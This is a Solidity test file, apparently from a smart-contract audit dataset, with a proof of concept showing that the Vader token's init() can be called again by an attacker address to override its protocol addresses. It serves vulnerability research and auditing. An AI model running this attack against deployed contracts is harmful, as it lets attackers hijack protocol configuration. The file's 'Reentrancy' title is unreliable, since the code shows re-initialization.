// SPDX-License-Identifier: MIT
pragma solidity 0.8.3;

import "/home/mat/certora-ac-audit/certora-ac-datasets/detasets/web3bugs/dataset/web3bugs/5/vader-protocol/contracts/Vader.sol";

interface Vm {
    function prank(address sender) external;
}

/// @title PoC: VaderInit Reentrancy
/// @notice Demonstrates that init() can be called twice, overriding initial configuration
contract PoC_VaderInit {
    Vm private constant vm = Vm(
        address(uint160(uint256(keccak256("hevm cheat code"))))
    );

    Vader private target;
    address private constant DEPLOYER = address(0xD0B);
    address private constant ATTACKER = address(0xA11CE);
    address private constant VETHER = address(0x1001);
    address private constant USDV_ADDR = address(0x2002);
    address private constant UTILS_ADDR = address(0x3003);

    function setUp() public {
        vm.prank(DEPLOYER);
        target = new Vader();
    }

    /// @notice First call initializes with deployer's addresses
    function test_exploit() public {
        // Step 1: Deployer initializes with legitimate addresses
        vm.prank(DEPLOYER);
        target.init(VETHER, USDV_ADDR, UTILS_ADDR);

        // Verify first init succeeded
        require(target.VETHER() == VETHER, "First init failed");

        // Step 2: Attacker calls init with attacker-controlled addresses
        address maliciousVether = address(0xBAD1);
        address maliciousUSDV = address(0xBAD2);
        address maliciousUtils = address(0xBAD3);

        vm.prank(ATTACKER);
        target.init(maliciousVether, maliciousUSDV, maliciousUtils);

        // Impact: Protocol addresses have been overridden by attacker
        require(target.VETHER() == maliciousVether, "Exploit failed - addresses not overridden");
        require(target.USDV() == maliciousUSDV, "Exploit failed - USDV not overridden");
        require(target.UTILS() == maliciousUtils, "Exploit failed - UTILS not overridden");
    }
}
